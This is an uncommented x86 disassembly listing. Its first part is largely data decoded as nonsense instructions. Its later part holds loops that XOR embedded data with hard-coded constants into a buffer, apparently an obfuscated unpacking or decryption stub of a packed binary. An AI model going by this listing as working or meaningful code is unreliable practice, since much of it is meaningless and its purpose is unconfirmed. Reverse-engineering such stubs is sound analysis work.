  42c787:	xchg   DWORD PTR [ebx+0xffcccb],esp
  42c78d:	jmp    DWORD PTR [eax]
  42c78f:	jno    0x42c74c
  42c791:	(bad)  
  42c792:	inc    DWORD PTR [ebx+0xa0cff00]
  42c798:	lods   al,BYTE PTR ds:[esi]
  42c799:	inc    esi
  42c79a:	add    BYTE PTR [eax],al
  42c79c:	(bad)  
  42c79d:	jmp    DWORD PTR [edi]
  42c79f:	test   bl,al
  42c7a1:	and    BYTE PTR [ebx-0x1c330001],al
  42c7a7:	dec    eax
  42c7a8:	add    eax,0xffffff58
  42c7ad:	int3   
  42c7ae:	repz (bad) 
  42c7b1:	cld    
  42c7b2:	(bad)  
  42c7b3:	(bad)  
  42c7b4:	inc    DWORD PTR [ebx-0xa27646b]
  42c7ba:	add    BYTE PTR [ecx+0x41a783cc],cl
  42c7c0:	dec    edx
  42c7c1:	push   ecx
  42c7c2:	add    BYTE PTR [eax],al
  42c7c4:	inc    DWORD PTR [ebx+0x19f3a65c]
  42c7ca:	dec    esp
  42c7cc:	add    BYTE PTR [ebx-0x67121474],al
  42c7d2:	add    BYTE PTR [ebx-0x2750100],al
  42c7d8:	sub    eax,0xffff90
  42c7dd:	push   DWORD PTR [edx]
  42c7df:	dec    edi
  42c7e0:	aam    0x71
  42c7e2:	cmp    edi,0x0
  42c7e5:	adc    DWORD PTR [edx],0xffffffff
  42c7e8:	out    0xab,eax
  42c7ea:	inc    DWORD PTR [ebx-0xdd8337d]
  42c7f0:	xlat   BYTE PTR ds:[ebx]
  42c7f1:	outs   dx,BYTE PTR ds:[esi]
  42c7f2:	inc    DWORD PTR [eax]
  42c7f4:	add    bh,bh
  42c7f6:	pmulhw mm2,mm3
  42c7f9:	rol    BYTE PTR [ebx-0x45330100],cl
  42c7ff:	out    0x87,al
  42c801:	das    
  42c802:	add    BYTE PTR [eax],al
  42c804:	dec    DWORD PTR [ecx+0x465ff3b9]
  42c80a:	(bad)  
  42c80b:	(bad)  
  42c80c:	inc    DWORD PTR [eax]
  42c80e:	retf   
  42c80f:	jo     0x42c7b0
  42c811:	icebp  
  42c812:	inc    DWORD PTR [eax]
  42c814:	(bad)  
  42c815:	call   FWORD PTR [ecx-0x15]
  42c818:	enter  0xc6,0xff
  42c81c:	add    ah,cl
  42c81e:	inc    edi
  42c81f:	and    eax,0x89ff7ddd
  42c824:	(bad)  
  42c825:	push   DWORD PTR [eax+ecx*4]
  42c828:	pop    edi
  42c829:	aam    0x0
  42c82b:	inc    DWORD PTR [eax]
  42c82d:	add    BYTE PTR [edx],cl
  42c82f:	or     bh,BYTE PTR [eax-0x51]
  42c832:	(bad)  
  42c833:	dec    esp
  42c835:	add    BYTE PTR [ecx-0x13],al
  42c838:	call   0xf900:0x8383e3
  42c83f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c840:	jnp    0x42c7f9
  42c842:	add    bh,bh
  42c844:	inc    DWORD PTR [eax]
  42c846:	jnp    0x42c8c7
  42c848:	in     eax,dx
  42c849:	out    dx,al
  42c84a:	(bad)  
  42c84b:	dec    DWORD PTR [ecx-0x5590f877]
  42c851:	inc    DWORD PTR [eax]
  42c853:	int3   
  42c854:	inc    DWORD PTR [ebx+0x50c9929b]
  42c85a:	add    bh,bh
  42c85c:	add    ah,cl
  42c85e:	(bad)  
  42c85f:	push   ebp
  42c860:	add    al,0xd7
  42c862:	or     DWORD PTR [ecx-0x4cc07d00],0x55
  42c869:	mov    ebp,0xff00ff00
  42c86e:	ret    0xcafe
  42c871:	mov    esp,cs
  42c873:	dec    DWORD PTR [ecx+0x5813800]
  42c879:	std    
  42c87a:	add    bh,bh
  42c87c:	cmp    edi,0x7d
  42c87f:	mov    ecx,DWORD PTR [eax-0x46]
  42c882:	add    BYTE PTR [eax],al
  42c884:	inc    DWORD PTR [eax]
  42c886:	ins    DWORD PTR es:[edi],dx
  42c887:	div    dl
  42c889:	or     edi,edi
  42c88b:	dec    DWORD PTR [ecx+0x1de3b6ff]
  42c891:	fcmovne st,st(4)
  42c893:	add    BYTE PTR [ecx-0x4c548d01],cl
  42c899:	mov    ds:0xcc00ccff,eax
  42c89e:	cmp    edi,DWORD PTR ds:0xff897c0a
  42c8a4:	add    BYTE PTR [eax],al
  42c8a6:	scas   eax,DWORD PTR es:[edi]
  42c8a7:	adc    cl,cl
  42c8a9:	(bad)  
  42c8aa:	(bad)  
  42c8ab:	(bad)  
  42c8ac:	inc    DWORD PTR [eax]
  42c8ae:	ins    BYTE PTR es:[edi],dx
  42c8af:	inc    edi
  42c8b0:	out    dx,eax
  42c8b1:	mov    dh,0x0
  42c8b3:	(bad)  
  42c8b4:	(bad)  
  42c8b5:	jmp    FWORD PTR [esi+0x1c3e99]
  42c8bb:	(bad)  
  42c8bc:	inc    DWORD PTR [eax]
  42c8be:	or     edx,edi
  42c8c0:	and    eax,0xff00ff8e
  42c8c5:	call   DWORD PTR [eax+edx*4+0x5f]
  42c8c9:	pop    ebp
  42c8ca:	inc    DWORD PTR [eax]
  42c8cc:	int3   
  42c8cd:	add    BYTE PTR [ecx-0x65],ah
  42c8d0:	sbb    DWORD PTR [eax+eax*1-0x3eff007d],ebp
  42c8d7:	jg     0x42c882
  42c8d9:	repz (bad) 
  42c8db:	(bad)  
  42c8dc:	(bad)  
  42c8dd:	(bad)  
  42c8de:	cmp    BYTE PTR [ebx+eax*2],ch
  42c8e1:	popa   
  42c8e2:	(bad)  
  42c8e3:	dec    DWORD PTR [ecx-0x461fd877]
  42c8e9:	xchg   ebx,eax
  42c8ea:	add    BYTE PTR [eax],al
  42c8ec:	(bad)  
  42c8ed:	(bad)  
  42c8ee:	cmp    bh,BYTE PTR ds:0x893235
  42c8f4:	add    bh,bh
  42c8f6:	and    eax,0xfff16b2b
  42c8fb:	inc    DWORD PTR [eax]
  42c8fd:	add    cl,bh
  42c8ff:	lock ret 
  42c901:	pop    es
  42c902:	(bad)  
  42c903:	(bad)  
  42c904:	inc    DWORD PTR [eax]
  42c906:	jg     0x42c8de
  42c908:	jns    0x42c984
  42c90a:	(bad)  
  42c90b:	inc    DWORD PTR [eax]
  42c90d:	and    eax,0xffffff85
  42c910:	int3   
  42c911:	sar    edi,0xff
  42c914:	add    bh,bh
  42c916:	aam    0xf6
  42c918:	and    al,0x8a
  42c91a:	add    bh,bh
  42c91c:	add    bh,bh
  42c91e:	adc    esp,DWORD PTR [edx-0xd4af]
  42c924:	add    BYTE PTR [ecx-0x32cc5a1c],cl
  42c92a:	inc    DWORD PTR [eax]
  42c92c:	add    ah,cl
  42c92e:	sub    edi,ebp
  42c930:	and    eax,DWORD PTR [eax-0x76000001]
  42c936:	test   DWORD PTR [ebx],ebx
  42c938:	cdq    
  42c939:	(bad)  
  42c93b:	dec    esp
  42c93d:	mov    esi,ecx
  42c93f:	mul    ebx
  42c941:	cmp    eax,DWORD PTR [ebx+0x183ffff]
  42c947:	xchg   ecx,eax
  42c948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c949:	fiadd  DWORD PTR [ebx+0x60830083]
  42c94f:	xor    ch,dh
  42c951:	xor    al,BYTE PTR [eax]
  42c953:	mov    edi,edi
  42c955:	call   ecx
  42c957:	jbe    0x42c974
  42c959:	sbb    DWORD PTR [eax],eax
  42c95b:	(bad)  
  42c95c:	dec    DWORD PTR [ecx-0x3a1719fb]
  42c962:	dec    esp
  42c964:	cmp    edi,0x15
  42c967:	cli    
  42c968:	scas   al,BYTE PTR es:[edi]
  42c969:	mov    edi,?
  42c96b:	dec    DWORD PTR [ecx-0xa99d501]
  42c971:	int3   
  42c972:	(bad)  
  42c973:	dec    esp
  42c975:	call   FWORD PTR [ebx-0x7ccec9b5]
  42c97b:	mov    edi,edi
  42c97d:	add    BYTE PTR [esp+edx*4],dl
  42c980:	cli    
  42c981:	test   eax,0xffccffff
  42c986:	sub    al,0x87
  42c988:	ficomp WORD PTR [eax-0x330100]
  42c98e:	sahf   
  42c98f:	sbb    eax,0x83007b92
  42c994:	inc    DWORD PTR [eax]
  42c996:	jle    0x42ca0f
  42c998:	xor    al,BYTE PTR [eax+eax*1-0x1d00ff7d]
  42c99f:	sub    BYTE PTR [eax],bl
  42c9a1:	push   eax
  42c9a2:	inc    DWORD PTR [eax]
  42c9a4:	int3   
  42c9a5:	(bad)  
  42c9a6:	cmp    dl,ch
  42c9a8:	rcl    DWORD PTR [ebp+0x0],1
  42c9ab:	add    DWORD PTR [eax],0xffffffff
  42c9ae:	sub    al,0x88
  42c9b0:	and    ecx,DWORD PTR [ebx+eax*4+0x0]
  42c9b4:	inc    DWORD PTR [ebx+0x14d9d84c]
  42c9ba:	inc    DWORD PTR [eax]
  42c9bc:	(bad)  
  42c9bd:	jmp    ebp
  42c9bf:	pop    ss
  42c9c0:	xchg   ebp,eax
  42c9c1:	into   
  42c9c2:	(bad)  
  42c9c3:	inc    DWORD PTR [eax]
  42c9c5:	add    BYTE PTR [edx],ch
  42c9c7:	sub    eax,esi
  42c9c9:	test   edi,edi
  42c9cb:	cmp    edi,0x0
  42c9ce:	gs mov esp,0xffe20b
  42c9d4:	inc    DWORD PTR [ebx+0xc06c826]
  42c9da:	(bad)  
  42c9db:	(bad)  
  42c9dc:	(bad)  
  42c9dd:	push   ecx
  42c9df:	xchg   ebx,eax
  42c9e0:	sub    al,0x2e
  42c9e2:	add    bh,bh
  42c9e4:	int3   
  42c9e5:	add    cl,cl
  42c9e7:	ja     0x42ca45
  42c9e9:	inc    DWORD PTR cs:[ebx+0x5b9b0083]
  42c9f0:	jle    0x42ca1e
  42c9f2:	add    BYTE PTR [ecx+0x57ebffff],cl
  42c9f8:	ins    BYTE PTR es:[edi],dx
  42c9f9:	or     bh,bh
  42c9fb:	cmp    edi,0xffffff83
  42c9fe:	hlt    
  42c9ff:	out    0x1e,al
  42ca01:	jo     0x42ca02
  42ca03:	mov    DWORD PTR [eax],eax
  42ca05:	add    BYTE PTR [edx-0x59],bh
  42ca08:	xchg   esp,eax
  42ca09:	sti    
  42ca0a:	int3   
  42ca0b:	inc    DWORD PTR [eax]
  42ca0d:	cmp    DWORD PTR [esi],0x1
  42ca10:	add    DWORD PTR [eax+eax*1-0x1],esp
  42ca14:	or     esp,0x63
  42ca17:	hlt    
  42ca18:	mov    edi,0xff005b
  42ca1d:	mov    DWORD PTR [edi+0x6b],edx
  42ca20:	test   al,0x35
  42ca22:	add    bh,bh
  42ca24:	(bad)  
  42ca25:	(bad)  
  42ca26:	cmp    dl,BYTE PTR [ebp-0x21]
  42ca29:	scas   al,BYTE PTR es:[edi]
  42ca2a:	int3   
  42ca2b:	int3   
  42ca2c:	add    BYTE PTR [eax],al
  42ca2e:	jle    0x42ca50
  42ca30:	mov    bh,BYTE PTR [esi+0xccffcc]
  42ca36:	push   ebx
  42ca37:	jno    0x42ca2f
  42ca39:	dec    esp
  42ca3a:	add    ah,cl
  42ca3c:	(bad)  
  42ca3d:	(bad)  
  42ca3e:	cmp    al,0xd6
  42ca40:	mul    DWORD PTR [eax]
  42ca42:	int3   
  42ca43:	cmp    edi,0x0
  42ca46:	and    cl,BYTE PTR [esi-0x25]
  42ca49:	in     eax,0x0
  42ca4b:	int3   
  42ca4c:	cmp    edi,0xffffffc6
  42ca4f:	es jecxz 0x42ca75
  42ca52:	add    ah,cl
  42ca54:	int3   
  42ca55:	add    BYTE PTR [esi-0x2e26e1],bh
  42ca5b:	add    DWORD PTR [eax],0xffffffff
  42ca5e:	ret    0x1715
  42ca61:	iret   
  42ca62:	dec    esp
  42ca64:	inc    DWORD PTR [eax]
  42ca66:	in     eax,dx
  42ca67:	scas   eax,DWORD PTR es:[edi]
  42ca68:	jle    0x42ca1a
  42ca6a:	(bad)  
  42ca6b:	inc    DWORD PTR [eax]
  42ca6d:	add    bh,bh
  42ca6f:	std    
  42ca70:	xchg   ch,cl
  42ca72:	add    BYTE PTR [ebx+0x65e3ff00],al
  42ca78:	dec    edx
  42ca79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca7a:	cmp    edi,0xffffffff
  42ca7d:	dec    DWORD PTR [ebx]
  42ca7f:	adc    edi,DWORD PTR [ebx]
  42ca81:	push   eax
  42ca82:	int3   
  42ca83:	cmp    edi,0x0
  42ca86:	sbb    ch,BYTE PTR [ebx+edx*1+0x44]
  42ca8a:	inc    DWORD PTR [ebx-0x60140000]
  42ca90:	outs   dx,DWORD PTR ds:[esi]
  42ca91:	mov    cl,0xff
  42ca93:	inc    DWORD PTR [ebx+0x5c86df00]
  42ca99:	xchg   edi,eax
  42ca9a:	mov    DWORD PTR [eax],eax
  42ca9c:	add    BYTE PTR [ecx-0x62f4aee4],cl
  42caa2:	(bad)  
  42caa3:	(bad)  
  42caa4:	(bad)  
  42caa5:	call   DWORD PTR [edx-0x7c]
  42caa8:	ins    BYTE PTR es:[edi],dx
  42caa9:	jge    0x42caaa
  42caab:	inc    DWORD PTR [eax]
  42caad:	(bad)  
  42caae:	cmp    eax,0xcc190a85
  42cab3:	cmp    edi,0x0
  42cab6:	xchg   esi,eax
  42cab7:	xchg   BYTE PTR ds:0xccffb2,dl
  42cabd:	call   DWORD PTR [ebx-0x7a]
  42cac0:	jnp    0x42cab9
  42cac2:	or     esp,0xffffffff
  42cac5:	dec    DWORD PTR [edi]
  42cac7:	xchg   BYTE PTR [edx+0x72],bl
  42cacd:	add    DWORD PTR [esi+eax*8],0xffffffac
  42cad1:	and    bh,bh
  42cad3:	int3   
  42cad4:	dec    esp
  42cad6:	test   al,0xdd
  42cad8:	jecxz  0x42cb0c
  42cada:	add    BYTE PTR [eax],al
  42cadc:	add    BYTE PTR [eax],al
  42cade:	adc    al,0x4b
  42cae0:	enter  0x24,0xff
  42cae4:	inc    DWORD PTR [eax]
  42cae6:	jmp    0xffcc:0x9fb0a2
  42caed:	call   FWORD PTR [edi-0x585aa5]
  42caf3:	(bad)  
  42caf4:	inc    DWORD PTR [eax]
  42caf6:	adc    ch,BYTE PTR [edx+ecx*8+0x5f]
  42cafa:	or     DWORD PTR [ecx-0x3cd0000],0x19
  42cb01:	js     0x42cb02
  42cb03:	add    BYTE PTR [eax],al
  42cb05:	add    bh,ah
  42cb07:	mov    ebp,0xccdf63
  42cb0c:	mov    DWORD PTR [eax],eax
  42cb0e:	sbb    DWORD PTR ss:[esi-0x7600ffab],ecx
  42cb15:	dec    DWORD PTR [edi+eax*8]
  42cb18:	in     al,dx
  42cb19:	xchg   esp,ecx
  42cb1b:	inc    DWORD PTR [ebx-0x6d09187d]
  42cb21:	xchg   esi,eax
  42cb22:	add    bh,bh
  42cb24:	(bad)  
  42cb25:	call   FWORD PTR [ecx-0x7c1b0d1b]
  42cb2b:	mov    esp,ecx
  42cb2d:	(bad)  
  42cb2e:	fdiv   st,st(4)
  42cb30:	xor    eax,0x890000a3
  42cb35:	(bad)  
  42cb36:	fcom   DWORD PTR [ebp-0x11]
  42cb39:	aad    0x83
  42cb3b:	int3   
  42cb3c:	add    ah,cl
  42cb3e:	push   0x6b
  42cb40:	lock (bad) 
  42cb42:	dec    esp
  42cb44:	(bad)  
  42cb45:	dec    DWORD PTR [ebx+0xc86de3]
  42cb4b:	add    bh,bh
  42cb4d:	push   edi
  42cb4f:	jne    0x42cb1b
  42cb51:	mov    dh,0xff
  42cb53:	add    bh,bh
  42cb55:	add    BYTE PTR [ecx-0x1d],ah
  42cb58:	jbe    0x42cae2
  42cb5a:	(bad)  
  42cb5b:	(bad)  
  42cb5c:	(bad)  
  42cb5d:	push   DWORD PTR [eax+edx*2+0x2f]
  42cb61:	jno    0x42cae6
  42cb63:	inc    DWORD PTR [eax]
  42cb65:	add    BYTE PTR [ebp+0x19291c],ch
  42cb6b:	int3   
  42cb6c:	(bad)  
  42cb6d:	jmp    edx
  42cb6f:	and    al,0xfc
  42cb71:	sar    bh,0xff
  42cb74:	inc    DWORD PTR [eax]
  42cb76:	sub    esi,0xff2f6c
  42cb7c:	(bad)  
  42cb7d:	call   FWORD PTR [ecx+0x71]
  42cb80:	call   0x1dff:0xe8
  42cb87:	lods   al,BYTE PTR ds:[esi]
  42cb88:	int3   
  42cb89:	cli    
  42cb8a:	add    BYTE PTR [ecx-0x620a0077],cl
  42cb90:	lods   eax,DWORD PTR ds:[esi]
  42cb91:	sub    bh,bh
  42cb93:	(bad)  
  42cb94:	inc    DWORD PTR [eax]
  42cb96:	fst    st(6)
  42cb98:	mov    ah,0xec
  42cb9a:	mov    DWORD PTR [ecx+0x16a28300],ecx
  42cba0:	or     eax,0xff890035
  42cba5:	int3   
  42cba6:	lods   al,BYTE PTR ds:[esi]
  42cba7:	jbe    0x42cbca
  42cba9:	(bad)  
  42cbaa:	(bad)  
  42cbab:	(bad)  
  42cbac:	(bad)  
  42cbad:	call   FWORD PTR [esi-0x2bb47a]
  42cbb3:	add    BYTE PTR [ecx-0x33b79401],cl
  42cbb9:	int3   
  42cbba:	int3   
  42cbbb:	int3   
  42cbbc:	int3   
  42cbbd:	int3   
  42cbbe:	int3   
  42cbbf:	int3   
  42cbc0:	mov    edx,DWORD PTR ds:0x448d20
  42cbc6:	mov    ecx,DWORD PTR ds:0x448038
  42cbcc:	push   esi
  42cbcd:	push   edi
  42cbce:	add    edx,0x19470
  42cbd4:	mov    esi,0x2b1
  42cbd9:	lea    esp,[esp+0x0]
  42cbe0:	movzx  eax,WORD PTR [ecx+0x6]
  42cbe4:	movzx  ecx,WORD PTR [ecx+0x3]
  42cbe8:	shl    eax,0x10
  42cbeb:	add    eax,ecx
  42cbed:	mov    ecx,DWORD PTR ds:0x448d1c
  42cbf3:	add    ecx,0xe1b4b96a
  42cbf9:	xor    ecx,eax
  42cbfb:	mov    ds:0x448d10,eax
  42cc00:	mov    DWORD PTR [edx],ecx
  42cc02:	mov    ecx,DWORD PTR ds:0x448038
  42cc08:	add    ecx,0x8
  42cc0b:	add    edx,0x4
  42cc0e:	dec    esi
  42cc0f:	mov    DWORD PTR ds:0x448038,ecx
  42cc15:	jne    0x42cbe0
  42cc17:	push   ebp
  42cc18:	mov    ebp,DWORD PTR ds:0x445024
  42cc1e:	push   esi
  42cc1f:	call   ebp
  42cc21:	mov    eax,ds:0x448d20
  42cc26:	mov    edx,DWORD PTR ds:0x44803c
  42cc2c:	add    eax,0x19f34
  42cc31:	mov    esi,0x59
  42cc36:	jmp    0x42cc40
  42cc38:	lea    esp,[esp+0x0]
  42cc3f:	nop
  42cc40:	movzx  ecx,BYTE PTR [edx+0x5]
  42cc44:	movzx  edi,BYTE PTR [edx+0x2]
  42cc48:	movzx  edx,WORD PTR [edx]
  42cc4b:	shl    ecx,0x8
  42cc4e:	add    ecx,edi
  42cc50:	shl    ecx,0x10
  42cc53:	add    ecx,edx
  42cc55:	mov    DWORD PTR ds:0x448d10,ecx
  42cc5b:	mov    edx,0x13457fae
  42cc60:	sub    edx,DWORD PTR ds:0x448d1c
  42cc66:	xor    edx,ecx
  42cc68:	mov    DWORD PTR [eax],edx
  42cc6a:	mov    edx,DWORD PTR ds:0x44803c
  42cc70:	movzx  ecx,WORD PTR [edx+0xa]
  42cc74:	movzx  edx,WORD PTR [edx+0x7]
  42cc78:	shl    ecx,0x10
  42cc7b:	add    ecx,edx
  42cc7d:	mov    edx,DWORD PTR ds:0x448d1c
  42cc83:	mov    DWORD PTR ds:0x448d10,ecx
  42cc89:	add    edx,0x133d7be2
  42cc8f:	xor    edx,ecx
  42cc91:	mov    DWORD PTR [eax+0x4],edx
  42cc94:	mov    edx,DWORD PTR ds:0x44803c
  42cc9a:	add    edx,0x10
  42cc9d:	mov    DWORD PTR ds:0x44803c,edx
  42cca3:	movzx  ecx,BYTE PTR [edx+0x5]
  42cca7:	movzx  edi,BYTE PTR [edx+0x2]
  42ccab:	movzx  edx,WORD PTR [edx]
  42ccae:	shl    ecx,0x8
  42ccb1:	add    ecx,edi
  42ccb3:	shl    ecx,0x10
  42ccb6:	add    ecx,edx
  42ccb8:	mov    DWORD PTR ds:0x448d10,ecx
  42ccbe:	mov    edx,0x13457fae
  42ccc3:	sub    edx,DWORD PTR ds:0x448d1c
  42ccc9:	xor    edx,ecx
  42cccb:	mov    DWORD PTR [eax+0x8],edx
  42ccce:	mov    edx,DWORD PTR ds:0x44803c
  42ccd4:	movzx  ecx,WORD PTR [edx+0xa]
  42ccd8:	movzx  edx,WORD PTR [edx+0x7]
  42ccdc:	shl    ecx,0x10
  42ccdf:	add    ecx,edx
  42cce1:	mov    edx,DWORD PTR ds:0x448d1c
  42cce7:	mov    DWORD PTR ds:0x448d10,ecx
  42cced:	add    edx,0x133d7be2
  42ccf3:	xor    edx,ecx
  42ccf5:	mov    DWORD PTR [eax+0xc],edx
  42ccf8:	mov    edx,DWORD PTR ds:0x44803c
  42ccfe:	add    edx,0x10
  42cd01:	mov    DWORD PTR ds:0x44803c,edx
  42cd07:	movzx  ecx,BYTE PTR [edx+0x5]
  42cd0b:	movzx  edi,BYTE PTR [edx+0x2]
  42cd0f:	movzx  edx,WORD PTR [edx]
  42cd12:	shl    ecx,0x8
  42cd15:	add    ecx,edi
  42cd17:	shl    ecx,0x10
  42cd1a:	add    ecx,edx
  42cd1c:	mov    DWORD PTR ds:0x448d10,ecx
  42cd22:	mov    edx,0x13457fae
  42cd27:	sub    edx,DWORD PTR ds:0x448d1c
  42cd2d:	xor    edx,ecx
  42cd2f:	mov    DWORD PTR [eax+0x10],edx
  42cd32:	mov    edx,DWORD PTR ds:0x44803c
  42cd38:	movzx  ecx,WORD PTR [edx+0xa]
  42cd3c:	movzx  edx,WORD PTR [edx+0x7]
  42cd40:	shl    ecx,0x10
  42cd43:	add    ecx,edx
  42cd45:	mov    edx,DWORD PTR ds:0x448d1c
  42cd4b:	add    edx,0x133d7be2
  42cd51:	xor    edx,ecx
  42cd53:	mov    DWORD PTR ds:0x448d10,ecx
  42cd59:	mov    DWORD PTR [eax+0x14],edx
  42cd5c:	mov    edx,DWORD PTR ds:0x44803c
  42cd62:	add    edx,0x10
  42cd65:	mov    DWORD PTR ds:0x44803c,edx
  42cd6b:	movzx  ecx,BYTE PTR [edx+0x5]
  42cd6f:	movzx  edi,BYTE PTR [edx+0x2]
  42cd73:	movzx  edx,WORD PTR [edx]
  42cd76:	shl    ecx,0x8
  42cd79:	add    ecx,edi
  42cd7b:	shl    ecx,0x10
  42cd7e:	add    ecx,edx
  42cd80:	mov    DWORD PTR ds:0x448d10,ecx
  42cd86:	mov    edx,0x13457fae
  42cd8b:	sub    edx,DWORD PTR ds:0x448d1c
  42cd91:	add    eax,0x20
  42cd94:	xor    edx,ecx
  42cd96:	mov    DWORD PTR [eax-0x8],edx
  42cd99:	mov    edx,DWORD PTR ds:0x44803c
  42cd9f:	movzx  ecx,WORD PTR [edx+0xa]
  42cda3:	movzx  edx,WORD PTR [edx+0x7]
  42cda7:	shl    ecx,0x10
  42cdaa:	add    ecx,edx
  42cdac:	mov    edx,DWORD PTR ds:0x448d1c
  42cdb2:	add    edx,0x133d7be2
  42cdb8:	xor    edx,ecx
  42cdba:	mov    DWORD PTR ds:0x448d10,ecx
  42cdc0:	mov    DWORD PTR [eax-0x4],edx
  42cdc3:	mov    edx,DWORD PTR ds:0x44803c
  42cdc9:	add    edx,0x10
  42cdcc:	dec    esi
  42cdcd:	mov    DWORD PTR ds:0x44803c,edx
  42cdd3:	jne    0x42cc40
  42cdd9:	movzx  ecx,BYTE PTR [edx+0x5]
  42cddd:	movzx  esi,BYTE PTR [edx+0x2]
  42cde1:	movzx  edx,WORD PTR [edx]
  42cde4:	shl    ecx,0x8
  42cde7:	add    ecx,esi
  42cde9:	shl    ecx,0x10
  42cdec:	add    ecx,edx
  42cdee:	mov    edx,0x13457fae
  42cdf3:	sub    edx,DWORD PTR ds:0x448d1c
  42cdf9:	push   ebx
  42cdfa:	xor    edx,ecx
  42cdfc:	mov    DWORD PTR ds:0x448d10,ecx
  42ce02:	push   0x0
  42ce04:	mov    DWORD PTR [eax],edx
  42ce06:	call   ebp
  42ce08:	mov    esi,DWORD PTR ds:0x448d20
  42ce0e:	mov    ebx,DWORD PTR ds:0x44500c
  42ce14:	add    esi,0x1aa58
  42ce1a:	mov    edi,0x229
  42ce1f:	nop
  42ce20:	push   0x23d
  42ce25:	call   ebx
  42ce27:	mov    ecx,DWORD PTR ds:0x448040
  42ce2d:	movzx  eax,WORD PTR [ecx+0x4]
  42ce31:	movzx  ecx,WORD PTR [ecx]
  42ce34:	mov    edx,DWORD PTR ds:0x448d1c
  42ce3a:	shl    eax,0x10
  42ce3d:	add    eax,ecx
  42ce3f:	add    edx,0x1269b269
  42ce45:	xor    edx,eax
  42ce47:	mov    ds:0x448d10,eax
  42ce4c:	mov    DWORD PTR [esi],edx
  42ce4e:	add    DWORD PTR ds:0x448040,0x8
  42ce55:	add    esi,0x4
  42ce58:	dec    edi
  42ce59:	jne    0x42ce20
  42ce5b:	push   edi
  42ce5c:	call   ebp
  42ce5e:	mov    eax,ds:0x448d20
  42ce63:	mov    edx,DWORD PTR ds:0x448044
  42ce69:	add    eax,0x1b2fc
  42ce6e:	lea    esi,[edi+0x6d]
  42ce71:	pop    ebx
  42ce72:	movzx  ecx,WORD PTR [edx+0x6]
  42ce76:	movzx  edx,WORD PTR [edx+0x2]
  42ce7a:	shl    ecx,0x10
  42ce7d:	add    ecx,edx
  42ce7f:	mov    edx,DWORD PTR ds:0x448d1c
  42ce85:	mov    DWORD PTR ds:0x448d10,ecx
  42ce8b:	add    edx,0x57d29709
  42ce91:	xor    edx,ecx
  42ce93:	mov    DWORD PTR [eax],edx
  42ce95:	mov    edx,DWORD PTR ds:0x448044
  42ce9b:	movzx  ecx,BYTE PTR [edx+0xf]
  42ce9f:	movzx  edi,BYTE PTR [edx+0xd]
  42cea3:	movzx  edx,WORD PTR [edx+0xb]
  42cea7:	shl    ecx,0x8
  42ceaa:	add    ecx,edi
  42ceac:	shl    ecx,0x10
  42ceaf:	add    ecx,edx
  42ceb1:	mov    DWORD PTR ds:0x448d10,ecx
  42ceb7:	mov    edx,0x57da9ad5
  42cebc:	sub    edx,DWORD PTR ds:0x448d1c
  42cec2:	add    eax,0x18
  42cec5:	xor    edx,ecx
  42cec7:	mov    DWORD PTR [eax-0x14],edx
  42ceca:	mov    edx,DWORD PTR ds:0x448044
  42ced0:	add    edx,0x10
  42ced3:	mov    DWORD PTR ds:0x448044,edx
  42ced9:	movzx  ecx,WORD PTR [edx+0x6]
  42cedd:	movzx  edx,WORD PTR [edx+0x2]
  42cee1:	shl    ecx,0x10
  42cee4:	add    ecx,edx
  42cee6:	mov    edx,DWORD PTR ds:0x448d1c
  42ceec:	mov    DWORD PTR ds:0x448d10,ecx
  42cef2:	add    edx,0x57d29709
  42cef8:	xor    edx,ecx
  42cefa:	mov    DWORD PTR [eax-0x10],edx
  42cefd:	mov    edx,DWORD PTR ds:0x448044
  42cf03:	movzx  ecx,BYTE PTR [edx+0xf]
  42cf07:	movzx  edi,BYTE PTR [edx+0xd]
  42cf0b:	movzx  edx,WORD PTR [edx+0xb]
  42cf0f:	shl    ecx,0x8
  42cf12:	add    ecx,edi
  42cf14:	shl    ecx,0x10
  42cf17:	add    ecx,edx
  42cf19:	mov    DWORD PTR ds:0x448d10,ecx
  42cf1f:	mov    edx,0x57da9ad5
  42cf24:	sub    edx,DWORD PTR ds:0x448d1c
  42cf2a:	xor    edx,ecx
  42cf2c:	mov    DWORD PTR [eax-0xc],edx
  42cf2f:	mov    edx,DWORD PTR ds:0x448044
  42cf35:	add    edx,0x10
  42cf38:	mov    DWORD PTR ds:0x448044,edx
  42cf3e:	movzx  ecx,WORD PTR [edx+0x6]
  42cf42:	movzx  edx,WORD PTR [edx+0x2]
  42cf46:	shl    ecx,0x10
  42cf49:	add    ecx,edx
  42cf4b:	mov    edx,DWORD PTR ds:0x448d1c
  42cf51:	add    edx,0x57d29709
  42cf57:	xor    edx,ecx
  42cf59:	mov    DWORD PTR ds:0x448d10,ecx
  42cf5f:	mov    DWORD PTR [eax-0x8],edx
  42cf62:	mov    edx,DWORD PTR ds:0x448044
  42cf68:	movzx  ecx,BYTE PTR [edx+0xf]
  42cf6c:	movzx  edi,BYTE PTR [edx+0xd]
  42cf70:	movzx  edx,WORD PTR [edx+0xb]
  42cf74:	shl    ecx,0x8
  42cf77:	add    ecx,edi
  42cf79:	shl    ecx,0x10
  42cf7c:	add    ecx,edx
  42cf7e:	mov    edx,0x57da9ad5
  42cf83:	sub    edx,DWORD PTR ds:0x448d1c
  42cf89:	mov    DWORD PTR ds:0x448d10,ecx
  42cf8f:	xor    edx,ecx
  42cf91:	mov    DWORD PTR [eax-0x4],edx
  42cf94:	mov    edx,DWORD PTR ds:0x448044
  42cf9a:	add    edx,0x10
  42cf9d:	dec    esi
  42cf9e:	mov    DWORD PTR ds:0x448044,edx
  42cfa4:	jne    0x42ce72
  42cfaa:	movzx  ecx,WORD PTR [edx+0x6]
  42cfae:	movzx  edx,WORD PTR [edx+0x2]
  42cfb2:	shl    ecx,0x10
  42cfb5:	add    ecx,edx
  42cfb7:	mov    edx,0x57da9ad5
  42cfbc:	sub    edx,DWORD PTR ds:0x448d1c
  42cfc2:	mov    DWORD PTR ds:0x448d10,ecx
  42cfc8:	xor    edx,ecx
  42cfca:	mov    DWORD PTR [eax],edx
  42cfcc:	mov    ecx,DWORD PTR ds:0x448d20
  42cfd2:	mov    edx,DWORD PTR ds:0x448048
  42cfd8:	add    ecx,0x1bd38
  42cfde:	mov    esi,0xd9
  42cfe3:	movzx  eax,BYTE PTR [edx+0x6]
  42cfe7:	movzx  edi,WORD PTR [edx+0x3]
  42cfeb:	movzx  edx,BYTE PTR [edx+0x1]
  42cfef:	shl    eax,0x10
  42cff2:	add    eax,edi
